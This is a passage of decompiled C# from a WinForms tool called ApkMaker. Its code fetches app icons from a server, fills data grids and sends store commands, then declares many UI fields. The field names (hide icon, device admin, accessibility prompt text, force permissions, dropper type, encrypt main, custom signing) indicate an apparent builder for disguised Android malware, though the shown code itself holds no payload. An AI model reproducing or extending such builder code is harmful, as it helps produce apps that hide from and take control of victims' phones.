									_0024VB_0024ResumableLocal_app_folder_002414 = _0024VB_0024ResumableLocal_row_00249["app_folder"]?.ToString() ?? "";
									_0024VB_0024ResumableLocal_app_version_002415 = _0024VB_0024ResumableLocal_row_00249["app_version"]?.ToString() ?? "";
									_0024VB_0024ResumableLocal_app_ico_002416 = _0024VB_0024ResumableLocal_row_00249["app_ico"]?.ToString() ?? "";
									_0024VB_0024ResumableLocal_build_state_002417 = _0024VB_0024ResumableLocal_row_00249["appstate"]?.ToString() ?? "";
									try
									{
										_0024VB_0024ResumableLocal_appicon_002418 = null;
										if (MyRes.IsIconCached(_0024VB_0024ResumableLocal_app_id_002410))
										{
											_0024VB_0024ResumableLocal_cached_002419 = MyRes.GetCachedIcon(_0024VB_0024ResumableLocal_app_id_002410);
											if (_0024VB_0024ResumableLocal_cached_002419 != null)
											{
												_0024VB_0024ResumableLocal_appicon_002418 = (Bitmap)codes.ResizeImage(_0024VB_0024ResumableLocal_cached_002419, new Size(32, 32));
											}
										}
										else
										{
											_0024VB_0024ResumableLocal_fullUrl_002420 = _0024VB_0024Me.serverip + "/yaarsa/" + _0024VB_0024ResumableLocal_app_ico_002416;
											_0024VB_0024ResumableLocal_downloaded_002421 = codes.GetImageFromUrl(_0024VB_0024ResumableLocal_fullUrl_002420);
											if (_0024VB_0024ResumableLocal_downloaded_002421 != null)
											{
												_0024VB_0024ResumableLocal_appicon_002418 = (Bitmap)codes.ResizeImage(_0024VB_0024ResumableLocal_downloaded_002421, new Size(32, 32));
												MyRes.CacheIcon(_0024VB_0024ResumableLocal_app_id_002410, _0024VB_0024ResumableLocal_appicon_002418);
											}
											else
											{
												_0024VB_0024ResumableLocal_appicon_002418 = (Bitmap)codes.ResizeImage(Resources.androidhead, new Size(32, 32));
											}
										}
										_0024VB_0024ResumableLocal__0024VB_0024Closure__00246._0024VB_0024Local_rowsToAdd.Add(new Tuple<Bitmap, string, string, string, string, string, string>(_0024VB_0024ResumableLocal_appicon_002418, _0024VB_0024ResumableLocal_app_name_002411, _0024VB_0024ResumableLocal_app_id_002410, _0024VB_0024ResumableLocal_app_date_002413, _0024VB_0024ResumableLocal_app_size_002412, _0024VB_0024ResumableLocal_app_version_002415, _0024VB_0024ResumableLocal_build_state_002417));
									}
									catch (Exception ex3)
									{
										ProjectData.SetProjectError(ex3);
										Exception ex4 = ex3;
										_0024VB_0024ResumableLocal_ex_002422 = ex4;
										ProjectData.ClearProjectError();
									}
								}
							}
							finally
							{
								if (num < 0 && _0024S8 != null)
								{
									_0024S8.Dispose();
								}
							}
							_0024VB_0024Me.Invoke((VB_0024AnonymousDelegate_0)checked([SpecialName] () =>
							{
								Dictionary<string, DataGridViewRow> dictionary = new Dictionary<string, DataGridViewRow>();
								foreach (DataGridViewRow item3 in (IEnumerable)_0024VB_0024ResumableLocal__0024VB_0024Closure__00246._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.DGVSTORBLD.Rows)
								{
									if (item3.Tag != null)
									{
										dictionary[item3.Tag.ToString()] = item3;
									}
								}
								HashSet<string> hashSet = new HashSet<string>();
								foreach (Tuple<Bitmap, string, string, string, string, string, string> item4 in _0024VB_0024ResumableLocal__0024VB_0024Closure__00246._0024VB_0024Local_rowsToAdd)
								{
									string item = item4.Item3;
									hashSet.Add(item);
									if (dictionary.ContainsKey(item))
									{
										DataGridViewRow dataGridViewRow2 = dictionary[item];
										dataGridViewRow2.Cells[0].Value = item4.Item1;
										dataGridViewRow2.Cells[1].Value = item4.Item2;
										dataGridViewRow2.Cells[3].Value = item4.Item4;
										dataGridViewRow2.Cells[4].Value = item4.Item5;
										dataGridViewRow2.Cells[5].Value = item4.Item6;
										dataGridViewRow2.Cells[6].Value = item4.Item7;
									}
									else
									{
										int index = _0024VB_0024ResumableLocal__0024VB_0024Closure__00246._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.DGVSTORBLD.Rows.Add(item4.Item1, item4.Item2, item4.Item3, item4.Item4, item4.Item5, item4.Item6, item4.Item7);
										_0024VB_0024ResumableLocal__0024VB_0024Closure__00246._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.DGVSTORBLD.Rows[index].Tag = item;
									}
								}
								int num2 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00246._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.DGVSTORBLD.Rows.Count - 1;
								for (int i = num2; i >= 0; i += -1)
								{
									DataGridViewRow dataGridViewRow3 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00246._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.DGVSTORBLD.Rows[i];
									if (dataGridViewRow3.Tag != null)
									{
										string item2 = dataGridViewRow3.Tag.ToString();
										if (!hashSet.Contains(item2))
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00246._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.DGVSTORBLD.Rows.RemoveAt(i);
										}
									}
								}
								_0024VB_0024ResumableLocal__0024VB_0024Closure__00246._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.checkstore.Enabled = true;
							}));
						}
					}
					else
					{
						_0024VB_0024Me.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
						{
							BTAlerter.erroes(Conversions.ToString(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_result.Item2));
						}));
					}
					Thread.Sleep(5000);
				}
				catch (Exception ex5)
				{
					ProjectData.SetProjectError(ex5);
					Exception ex6 = ex5;
					_0024VB_0024ResumableLocal_ex_002423 = ex6;
					Debuger.Log_e("fetchworker", codes.EXtoString(_0024VB_0024ResumableLocal_ex_002423));
					ProjectData.ClearProjectError();
				}
				goto IL_0883;
				IL_0883:
				if (!_0024VB_0024Me.IsDisposed && !_0024VB_0024Me.Disposing)
				{
					goto IL_003a;
				}
			}
			catch (Exception ex7)
			{
				ProjectData.SetProjectError(ex7);
				Exception exception = ex7;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = (_0024State = -2);
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_1175_builderworker_DoWork : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal object _0024VB_0024Local_sender;

		internal DoWorkEventArgs _0024VB_0024Local_e;

		internal ApkMaker _0024VB_0024Me;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				_0024VB_0024Me.startbuilder();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception exception = ex;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = (_0024State = -2);
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__1157_002D0
	{
		public List<Tuple<Bitmap, string, string, string, string, string, string>> _0024VB_0024Local_rowsToAdd;

		public _Closure_0024__1157_002D1 _0024VB_0024NonLocal__0024VB_0024Closure_2;

		public _Closure_0024__1157_002D0(_Closure_0024__1157_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_rowsToAdd = arg0._0024VB_0024Local_rowsToAdd;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			Dictionary<string, DataGridViewRow> dictionary = new Dictionary<string, DataGridViewRow>();
			foreach (DataGridViewRow item3 in (IEnumerable)_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.DGVSTORBLD.Rows)
			{
				if (item3.Tag != null)
				{
					dictionary[item3.Tag.ToString()] = item3;
				}
			}
			HashSet<string> hashSet = new HashSet<string>();
			foreach (Tuple<Bitmap, string, string, string, string, string, string> item4 in _0024VB_0024Local_rowsToAdd)
			{
				string item = item4.Item3;
				hashSet.Add(item);
				if (dictionary.ContainsKey(item))
				{
					DataGridViewRow dataGridViewRow2 = dictionary[item];
					dataGridViewRow2.Cells[0].Value = item4.Item1;
					dataGridViewRow2.Cells[1].Value = item4.Item2;
					dataGridViewRow2.Cells[3].Value = item4.Item4;
					dataGridViewRow2.Cells[4].Value = item4.Item5;
					dataGridViewRow2.Cells[5].Value = item4.Item6;
					dataGridViewRow2.Cells[6].Value = item4.Item7;
				}
				else
				{
					int index = _0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.DGVSTORBLD.Rows.Add(item4.Item1, item4.Item2, item4.Item3, item4.Item4, item4.Item5, item4.Item6, item4.Item7);
					_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.DGVSTORBLD.Rows[index].Tag = item;
				}
			}
			checked
			{
				int num = _0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.DGVSTORBLD.Rows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					DataGridViewRow dataGridViewRow3 = _0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.DGVSTORBLD.Rows[i];
					if (dataGridViewRow3.Tag != null)
					{
						string item2 = dataGridViewRow3.Tag.ToString();
						if (!hashSet.Contains(item2))
						{
							_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.DGVSTORBLD.Rows.RemoveAt(i);
						}
					}
				}
				_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.checkstore.Enabled = true;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__1157_002D1
	{
		public (bool, object) _0024VB_0024Local_result;

		public ApkMaker _0024VB_0024Me;

		public _Closure_0024__1157_002D1(_Closure_0024__1157_002D1 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_result = arg0._0024VB_0024Local_result;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__1()
		{
			BTAlerter.erroes(Conversions.ToString(_0024VB_0024Local_result.Item2));
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__1176_002D0
	{
		public Dictionary<string, string> _0024VB_0024Local_params;

		public ApkMaker _0024VB_0024Me;

		public _Closure_0024__1176_002D0(_Closure_0024__1176_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_params = arg0._0024VB_0024Local_params;
			}
		}

		[SpecialName]
		internal async void _Lambda_0024__12()
		{
			try
			{
				_Closure_0024__1176_002D2 arg = default(_Closure_0024__1176_002D2);
				_Closure_0024__1176_002D2 CS_0024_003C_003E8__locals10 = new _Closure_0024__1176_002D2(arg)
				{
					_0024VB_0024NonLocal__0024VB_0024Closure_2 = this
				};
				_Closure_0024__1176_002D2 closure_0024__1176_002D = CS_0024_003C_003E8__locals10;
				TaskAwaiter<(bool, object)> taskAwaiter = MyServer.CommandStore(_0024VB_0024Local_params, _0024VB_0024Me.httpClient, _0024VB_0024Me.serverip).GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter<(bool, object)> taskAwaiter2 = default(TaskAwaiter<(bool, object)>);
					taskAwaiter = taskAwaiter2;
				}
				(bool, object) result = taskAwaiter.GetResult();
				closure_0024__1176_002D._0024VB_0024Local_result = result;
				if (_0024VB_0024Me.IsDisposed || !_0024VB_0024Me.IsHandleCreated)
				{
					return;
				}
				if (CS_0024_003C_003E8__locals10._0024VB_0024Local_result.Item1)
				{
					_Closure_0024__1176_002D1 arg2 = default(_Closure_0024__1176_002D1);
					_Closure_0024__1176_002D1 CS_0024_003C_003E8__locals9 = new _Closure_0024__1176_002D1(arg2);
					CS_0024_003C_003E8__locals9._0024VB_0024NonLocal__0024VB_0024Closure_3 = CS_0024_003C_003E8__locals10;
					CS_0024_003C_003E8__locals9._0024VB_0024Local_response = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(CS_0024_003C_003E8__locals9._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_result.Item2, null, "Replace", new object[2] { "\\", "" }, null, null, null), null, "Trim", new object[1] { "\"" }, null, null, null)));
					_0024VB_0024Me.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						MyMsg.Show("Success", CS_0024_003C_003E8__locals9._0024VB_0024Local_response, MyMsg.msgtype.Confirm, use_no: false);
						CS_0024_003C_003E8__locals9._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.Close();
					}));
				}
				else
				{
					_0024VB_0024Me.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						BTAlerter.erroes(Conversions.ToString(CS_0024_003C_003E8__locals10._0024VB_0024Local_result.Item2));
					}));
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__1176_002D1
	{
		public string _0024VB_0024Local_response;

		public _Closure_0024__1176_002D2 _0024VB_0024NonLocal__0024VB_0024Closure_3;

		public _Closure_0024__1176_002D1(_Closure_0024__1176_002D1 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_response = arg0._0024VB_0024Local_response;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__13()
		{
			MyMsg.Show("Success", _0024VB_0024Local_response, MyMsg.msgtype.Confirm, use_no: false);
			_0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.Close();
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__1176_002D2
	{
		public (bool, object) _0024VB_0024Local_result;

		public _Closure_0024__1176_002D0 _0024VB_0024NonLocal__0024VB_0024Closure_2;

		public _Closure_0024__1176_002D2(_Closure_0024__1176_002D2 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_result = arg0._0024VB_0024Local_result;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__14()
		{
			BTAlerter.erroes(Conversions.ToString(_0024VB_0024Local_result.Item2));
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("loadstorework")]
	private BackgroundWorker _loadstorework;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGVSTORBLD")]
	private DataGridView _DGVSTORBLD;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("appids")]
	private DrakeUITextBox _appids;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("listicons")]
	private ListView _listicons;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("iconsloader")]
	private BackgroundWorker _iconsloader;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGVPRIMB")]
	private DataGridView _DGVPRIMB;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClearAllToolStripMenuItem")]
	private ToolStripMenuItem _ClearAllToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Accmsgtext")]
	private DrakeUITextBox _Accmsgtext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Acctitletext")]
	private DrakeUITextBox _Acctitletext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("langtext")]
	private DrakeUIComboBox _langtext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Accbtntext")]
	private DrakeUITextBox _Accbtntext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("comboacctype")]
	private DrakeUIComboBox _comboacctype;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addnum")]
	private DrakeUIButtonIcon _addnum;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("builderworker")]
	private BackgroundWorker _builderworker;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkdisstore")]
	private DrakeUICheckBox _checkdisstore;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUICheckBox1")]
	private DrakeUICheckBox _DrakeUICheckBox1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("hideicocombox")]
	private DrakeUIComboBox _hideicocombox;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkjctjs")]
	private DrakeUICheckBox _checkjctjs;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkforceprims")]
	private DrakeUICheckBox _checkforceprims;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ListTags")]
	private ListBox _ListTags;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon5")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon6")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon7")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("btnstyleM")]
	private DrakeUIButtonIcon _btnstyleM;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("btnstyleD")]
	private DrakeUIButtonIcon _btnstyleD;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("nextbtn")]
	private DrakeUIButtonIcon _nextbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("backbtn")]
	private DrakeUIButtonIcon _backbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addicon")]
	private DrakeUIButtonIcon _addicon;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("randids")]
	private DrakeUIButtonIcon _randids;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("randver")]
	private DrakeUIButtonIcon _randver;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkplugin")]
	private DrakeUIOSSwitch _checkplugin;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon8")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon8;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon9")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon9;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Droplisticons")]
	private ListView _Droplisticons;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon10")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon10;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("combodroptype")]
	private DrakeUIComboBox _combodroptype;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("encryptmain")]
	private DrakeUICheckBox _encryptmain;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Devadmincheck")]
	private DrakeUICheckBox _Devadmincheck;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkreplcply")]
	private DrakeUICheckBox _checkreplcply;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkstore")]
	private DrakeUIOSSwitch _checkstore;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon11")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon11;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkaccsspage")]
	private DrakeUIOSSwitch _checkaccsspage;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon12")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon12;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon13")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon13;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon15")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon15;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon14")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon14;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("txtC")]
	private DrakeUITextBox _txtC;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("txtS")]
	private DrakeUITextBox _txtS;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("txtL")]
	private DrakeUITextBox _txtL;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("txtO")]
	private DrakeUITextBox _txtO;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("txtOU")]
	private DrakeUITextBox _txtOU;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("txtCN")]
	private DrakeUITextBox _txtCN;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("txtPassword")]
	private DrakeUITextBox _txtPassword;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("txtAliasName")]
	private DrakeUITextBox _txtAliasName;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("rankeybtn")]
	private DrakeUIButtonIcon _rankeybtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkcustmsign")]
	private DrakeUIOSSwitch _checkcustmsign;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Keysloader")]
	private BackgroundWorker _Keysloader;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGVKEYS")]
	private DataGridView _DGVKEYS;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem1")]
	private ToolStripMenuItem _ToolStripMenuItem1;

	private int currentStepIndex;

	private TagsManager TagsManager;

	private HttpClient httpClient;

	private HttpClient DownloadhttpClient;

	private string serverip;

	private string nextkey;

	private bool IamAlive;

	private Label stateLabel;

	private Dictionary<Control, string> tips;

	private Bitmap deficon;

	private Bitmap deficon_ok;

	private Bitmap deficon_ok_one;

	private ImageList chachedstore;

	private int reficonsspeed;

	private Random numberrandomer;

	private bool Package_keyback;

	private string LastSelectedTag;

	private UploadApp uploadform;

	private int lastRow;

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("maintabs")]
	internal virtual DrakeUITabControl maintabs
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage1")]
	internal virtual TabPage TabPage1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage2")]
	internal virtual TabPage TabPage2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage3")]
	internal virtual TabPage TabPage3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tiptext")]
	internal virtual DrakeUILabel tiptext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Tablogin")]
	internal virtual TabPage Tablogin
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker loadstorework
	{
		[CompilerGenerated]
		get
		{
			return _loadstorework;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = loadstorework_DoWork;
			BackgroundWorker backgroundWorker = _loadstorework;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_loadstorework = value;
			backgroundWorker = _loadstorework;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	public virtual DataGridView DGVSTORBLD
	{
		[CompilerGenerated]
		get
		{
			return _DGVSTORBLD;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellEventHandler value2 = DGVSTORBLD_SelectionChanged;
			DataGridView dataGridView = _DGVSTORBLD;
			if (dataGridView != null)
			{
				dataGridView.CellClick -= value2;
			}
			_DGVSTORBLD = value;
			dataGridView = _DGVSTORBLD;
			if (dataGridView != null)
			{
				dataGridView.CellClick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("title1t")]
	internal virtual Label title1t
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel24")]
	internal virtual Panel Panel24
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("labelname")]
	internal virtual DrakeUISymbolLabel labelname
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel7")]
	internal virtual Panel Panel7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("notlbl")]
	internal virtual DrakeUISymbolLabel notlbl
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("titletext")]
	internal virtual DrakeUITextBox titletext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel6")]
	internal virtual Panel Panel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblurl")]
	internal virtual DrakeUISymbolLabel lblurl
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("applink")]
	internal virtual DrakeUITextBox applink
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panelname")]
	internal virtual Panel Panelname
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lab3")]
